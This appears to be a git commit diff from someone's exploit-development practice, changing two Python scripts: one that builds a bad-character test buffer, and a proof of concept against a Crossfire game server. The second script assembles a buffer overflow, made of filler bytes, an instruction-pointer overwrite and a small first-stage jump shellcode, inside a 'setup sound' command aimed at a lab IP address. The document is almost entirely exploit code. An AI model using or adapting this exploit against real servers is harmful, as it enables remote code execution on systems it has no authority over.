9942ab0dfff1ed02de4cafc455e9a9d17ccb47de
zlwhro <zlwhro780@gmailc.com>
2022-10-01 09:20:51 -0400

    10/01

--- bad.py
+++ bad.py
@@ -3,19 +3,22 @@ import subprocess
 from sys import stdin
 from time import sleep
 
-bad=[0,0x0a,0x10,0x1A,0x3b,0x45]
+bad=[0,0x0a,0x0d,0xc2,0x37,0x20,0x39,0x7a]
 
-
-"""for i in range(256):
-    if(i not in bad):"""
+buf = b""
+for i in range(256):
+    if(i not in bad):
+        buf += i.to_bytes(1,'little')
+buf += b"\xff"
+buf += b"\n"
 
 """pattern_size = 4000
 pattern=subprocess.run(["msf-pattern_create","-l",str(pattern_size)],capture_output=True).stdout
 buf = pattern"""
 
-buf = b"a"*3892
+"""buf = b"a"*3892
 buf += b"\x2b\x86\x04\x08"
-buf += b"\x0a"
+buf += b"\x0a"""
 print(buf)
 
 
--- poc_crossfire.py
+++ poc_crossfire.py
@@ -1,20 +1,39 @@
 #!/usr/bin/python
-from asyncio.subprocess import STDOUT
 import socket
 import subprocess
-from sys import stderr
 
-host = "192.168.250.44"
+
+host = "192.168.196.44"
 
 pattern_size = 4379
 
-result = subprocess.run(["msf-pattern_create","-l", "{}".format(pattern_size)]
+"""result = subprocess.run(["msf-pattern_create","-l", "{}".format(pattern_size)]
 , stderr= subprocess.PIPE, stdout=subprocess.PIPE)
-crash = result.stdout
+crash = result.stdout"""
 ##print(result.stderr)
 
 ##print(crash)
-##crash = b"\x41" * 4379
+input_buf = b"\x41" * 1000
+
+bad = [0,0x20]
+for i in range(256):
+    if (i not in bad):
+        input_buf+= i.to_bytes(1,"little")
+input_buf += b"\x41" * (4368 - len(input_buf))
+
+eip = b"\x42"*4
+
+first_stage = b"\x83\xc0\x0c\xff\xe0\x90\x90"
+
+
+##first_stage = b""
+a = 0
+"""for i in range(a,a+5):
+    if(i not in bad):
+        first_stage += i.to_bytes(1,'little')"""
+
+
+crash = input_buf + eip + first_stage
 
 buffer = b"\x11(setup sound " + crash + b"\x90\x00#"
 
